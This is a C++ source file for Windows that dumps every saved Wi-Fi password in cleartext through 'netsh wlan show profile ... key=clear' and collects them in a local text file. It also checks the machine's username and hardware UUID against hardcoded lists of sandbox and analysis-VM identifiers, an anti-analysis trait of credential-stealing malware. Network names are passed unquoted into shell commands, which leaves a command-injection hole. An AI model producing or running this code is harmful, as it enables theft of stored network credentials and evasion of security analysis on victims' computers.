#ifndef ENABLE_VIRTUAL_TERMINAL_PROCESSING
#define ENABLE_VIRTUAL_TERMINAL_PROCESSING 0x0004
#endif

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <stdexcept>
#include <cstdio>
#include <cstdlib>
#include <sstream>
#include <array>
#include <stdexcept>
#include <iomanip>
#include <windows.h>
#include <random>
#include <conio.h>
#include <algorithm>
#include <sys/stat.h>

using namespace std;

void mdebug(const std::string &message)
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, 9);
    std::cout << message << std::endl;
    SetConsoleTextAttribute(hConsole, 15);
}

void merror(const std::string &message)
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, 12);
    std::cout << message << std::endl;
    SetConsoleTextAttribute(hConsole, 15);
}

void checkFileExists(std::string filename)
{
    if (std::remove(filename.c_str()) != 0)
    {
        mdebug("No existing file " + filename + " to delete.");
    }
    else
    {
        merror("Existing file " + filename + " deleted.");
    }
}

void recoverWifiPasswords(std::string wifi_passwords_filename)
{

    cout << "      _______         _  _  _ _       _______ _ " << std::endl;
    cout << "     |.-----.|       (_)(_)(_|_)     (_______|_)" << std::endl;
    cout << "     ||x . x||        _  _  _ _ _____ _____   _" << std::endl;
    cout << "     ||_.-._||       | || || | (_____)  ___) | |" << std::endl;
    cout << "     `--)-(--`       | || || | |     | |     | |" << std::endl;
    cout << "    __[=== o]___      \\_____/|_|     |_|     |_|" << std::endl;
    cout << "   |:::::::::::|\\    " << std::endl;
    cout << "   `-=========-`()            Passwords\n\n"
         << std::endl;

    checkFileExists(wifi_passwords_filename);
    std::ofstream file(wifi_passwords_filename, std::ios::out | std::ios::app);
    if (!file)
    {
        throw std::runtime_error("Error opening file");
    }

    mdebug("Created file and starting to save wifi passwords to it -> " + wifi_passwords_filename);
    mdebug("Running command: `netsh wlan show profiles`");

    std::string command = "netsh wlan show profiles";
    std::array<char, 128> buffer{}; // Initializes all elements to 0
    std::string data;
    FILE *pipe = _popen(command.c_str(), "r");
    if (!pipe)
    {
        throw std::runtime_error("popen() failed");
    }
    while (fgets(buffer.data(), 128, pipe) != nullptr)
    {
        data += buffer.data();
    }
    _pclose(pipe);

    std::vector<std::string> profiles;
    std::stringstream ss(data);
    std::string line;
    while (std::getline(ss, line))
    {
        if (line.find("All User Profile") != std::string::npos)
        {
            std::string profile = line.substr(line.find(":") + 2, line.length() - 1);
            profiles.push_back(profile);
        }
    }

    mdebug("Found a total of " + std::to_string(profiles.size()) + " WiFi networks");

    for (const auto &i : profiles)
    {
        try
        {
            std::string command = "netsh wlan show profile " + i + " key=clear";
            mdebug("Running command: `" + command + "`");
            std::array<char, 128> buffer{};
            std::string results;
            FILE *pipe = _popen(command.c_str(), "r");
            if (!pipe)
            {
                throw std::runtime_error("popen() failed");
            }
            while (fgets(buffer.data(), 128, pipe) != nullptr)
            {
                results += buffer.data();
            }
            _pclose(pipe);

            std::vector<std::string> keys;
            std::stringstream ss(results);
            std::string line;
            while (std::getline(ss, line))
            {
                if (line.find("Key Content") != std::string::npos)
                {
                    std::string key = line.substr(line.find(":") + 2, line.length() - 1);
                    keys.push_back(key);
                }
            }

            if (!keys.empty())
            {
                mdebug("Found password of " + i + " wifi network");
                file << std::left << std::setw(30) << i << "|  " << keys[0] << std::endl;
            }
            else
            {
                std::cout << "Unable to get the password of " << i << " network. No password is available -> by Running `netsh wlan show profile " << i << " key=clear`" << std::endl;
                file << std::left << std::setw(30) << i << "|  "
                     << "" << std::endl;
            }
        }
        catch (const std::exception &ex)
        {
            merror("Unable to get the wifi password of " + i + " network -> " + ex.what());
            file << std::left << std::setw(30) << i << "|  "
                 << "ENCODING ERROR" << std::endl;
        }
    }

    mdebug("Saved all wifi passwords to " + wifi_passwords_filename);
}


// Optional Checks
// ----------------------------------------------
void user_check()
{
    std::vector<std::string> USERS = {"BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", "WDAGUtilityAccount", "Abby", "patex", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "fred", "server", "BvJChRPnsxn", "Harry Johnson", "SqgFOf3G", "Lucas", "mike", "PateX", "h7dk1xPr", "Louise", "User01", "test", "RGzcBUyrznReg", "OgJb6GqgK0O"};
    
    try
    {
        std::string USER = getenv("USERNAME");
        if (std::find(USERS.begin(), USERS.end(), USER) != USERS.end())
        {
            merror("Username: " + USER + " is blacklisted");
        }
        else
        {
            mdebug("No Debug Mode Detected by Username of Machine");
        }
    }
    catch (const std::exception &e)
    {
        mdebug("[ERROR]: " + std::string(e.what()));
    }
}

void hwid_check() {
    try {
        std::vector<std::string> HWIDS = {"7AB5C494-39F5-4941-9163-47F54D6D5016","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4","FF577B79-782E-0A4D-8568-B35A9B7EB76B","08C1E400-3C56-11EA-8000-3CECEF43FEDE","6ECEAF72-3548-476C-BD8D-73134A9182C8","49434D53-0200-9036-2500-369025003865","119602E8-92F9-BD4B-8979-DA682276D385","12204D56-28C0-AB03-51B7-44A8B7525250","63FA3342-31C7-4E8E-8089-DAFF6CE5E967","365B4000-3B25-11EA-8000-3CECEF44010C","D8C30328-1B06-4611-8E3C-E433F4F9794E","00000000-0000-0000-0000-50E5493391EF","00000000-0000-0000-0000-AC1F6BD04D98","4CB82042-BA8F-1748-C941-363C391CA7F3","B6464A2B-92C7-4B95-A2D0-E5410081B812","BB233342-2E01-718F-D4A1-E7F69D026428","9921DE3A-5C1A-DF11-9078-563412000026","CC5B3F62-2A04-4D2E-A46C-AA41B7050712","00000000-0000-0000-0000-AC1F6BD04986","C249957A-AA08-4B21-933F-9271BEC63C85","BE784D56-81F5-2C8D-9D4B-5AB56F05D86E","ACA69200-3C4C-11EA-8000-3CECEF4401AA","3F284CA4-8BDF-489B-A273-41B44D668F6D","BB64E044-87BA-C847-BC0A-C797D1A16A50","2E6FB594-9D55-4424-8E74-CE25A25E36B0","42A82042-3F13-512F-5E3D-6BF4FFFD8518","38AB3342-66B0-7175-0B23-F390B3728B78","48941AE9-D52F-11DF-BBDA-503734826431","A7721742-BE24-8A1C-B859-D7F8251A83D3","3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E","D2DC3342-396C-6737-A8F6-0C6673C1DE08","EADD1742-4807-00A0-F92E-CCD933E9D8C1","AF1B2042-4B90-0000-A4E4-632A1C8C7EB1","FE455D1A-BE27-4BA4-96C8-967A6D3A9661","921E2042-70D3-F9F1-8CBD-B398A21F89C6","6AA13342-49AB-DC46-4F28-D7BDDCE6BE32","F68B2042-E3A7-2ADA-ADBC-A6274307A317","07AF2042-392C-229F-8491-455123CC85FB","4EDF3342-E7A2-5776-4AE5-57531F471D56","032E02B4-0499-05C3-0806-3C0700080009"};

        std::string commandLine = "wmic csproduct get uuid";

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Create the anonymous pipe to capture output
        HANDLE hChildStdoutRd, hChildStdoutWr;
        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;
        if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0)) {
            throw std::runtime_error("Failed to create anonymous pipe");
        }

        if (!SetHandleInformation(hChildStdoutRd, HANDLE_FLAG_INHERIT, 0)) {
            throw std::runtime_error("Failed to set handle information for anonymous pipe");
        }

        si.hStdOutput = hChildStdoutWr;
        si.dwFlags |= STARTF_USESTDHANDLES;

        // Launch the wmic process
        if (!CreateProcessA(NULL, &commandLine[0], NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            throw std::runtime_error("Failed to create process");
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        if (!CloseHandle(hChildStdoutWr)) {
            throw std::runtime_error("Failed to close handle to anonymous pipe");
        }

        char buffer[1024];
        DWORD bytesRead;
        std::string output;
        while (ReadFile(hChildStdoutRd, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
            output.append(buffer, bytesRead);
        }

        if (!CloseHandle(hChildStdoutRd)) {
            throw std::runtime_error("Failed to close handle to anonymous pipe");
        }

        std::string HWID = output.substr(0, output.find_first_of('\r'));

        if (std::find(HWIDS.begin(), HWIDS.end(), HWID) != HWIDS.end()) {
            throw std::runtime_error("HWID is blacklisted");
        } else {
            mdebug("HWID check passed");
        }
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR]: " << e.what() << std::endl;
    }
}


void anti_debug() {
    user_check();
    hwid_check();
}

int main()
{   
    // Anti Debug Mocde Check
    anti_debug();


    std::string username = getenv("USERNAME");
    std::string dir_path = ".\\" + username;

    std::string file_path = dir_path + "\\wifi.txt";

    if (std::system(("mkdir " + dir_path).c_str()) != 0)
    {
        std::cerr << "Directory " << username << " already exists." << std::endl;
    }

    recoverWifiPasswords(file_path);

    std::cout << "\n\nPress [Enter] to close the console window..." << std::endl;
    while (_getch() != 13)
        ;
    return 0;
}
